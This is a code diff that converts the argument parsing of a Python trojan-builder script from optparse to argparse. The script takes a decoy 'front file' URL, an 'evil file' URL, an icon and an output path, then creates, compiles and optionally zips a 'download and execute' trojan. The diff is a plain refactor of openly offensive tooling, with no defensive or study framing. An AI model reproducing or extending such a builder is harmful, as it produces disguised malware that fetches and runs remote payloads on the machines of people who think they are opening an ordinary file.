@@ -1,28 +1,19 @@
 #!/usr/bin/env python
 
-import optparse
+import argparse
 from Trojan import *
 
+parser = argparse.ArgumentParser(description='Generate a "download and execute" trojan with the given files.')
+parser.add_argument('-f', '--front-file', required=True, nargs=1, dest='front_file_url', help='Direct URL to file that the user will see.')
+parser.add_argument('-e', '--evil-file', required=True, nargs=1, dest='evil_file_url', help='Direct URL to the evil file file.')
+parser.add_argument('-o', '--out-file', required=True, nargs=1, dest='out_file_path', help='Location to store the result.')
+parser.add_argument('-i', '--icon', required=False, nargs=1, dest='icon_path', help='Trojan icon.', default=None)
+parser.add_argument('-z', '--zip', required=False, dest='zip', help='Zip trojan?', action="store_true", default=False)
+args= parser.parse_args()
 
-parser = optparse.OptionParser()
-parser.add_option('-f', '--front-file', dest='front_file_url', help='Direct URL to file that the user will see.')
-parser.add_option('-e', '--evil-file', dest='evil_file_url', help='Direct URL to the evil file file.')
-parser.add_option('-o', '--out-file', dest='out_file_path', help='Location to store the result.')
-parser.add_option('-i', '--icon', dest='icon_path', help='Trojan icon.')
-parser.add_option('-z', '--zip', dest='zip', help='Zip trojan?', action="store_true")
-
-(options, args) = parser.parse_args()
-
-if not options.front_file_url:
-	parser.error("Please specify front file, use --help argument for more info.")
-if not options.evil_file_url:
-	parser.error("Please specify evil file, use --help argument for more info.")
-if not options.out_file_path:
-	parser.error("Please specify out file, use --help argument for more info.")
-
-trojan = Trojan(options.front_file_url, options.evil_file_url, options.icon_path, options.out_file_path)
+trojan = Trojan(args.front_file_url[0], args.evil_file_url[0], args.icon_path, args.out_file_path[0])
 trojan.create()
 trojan.compile()
 
-if options.zip: 
-	trojan.zip(options.out_file_path)
+if args.zip: 
+	trojan.zip(args.out_file_path)
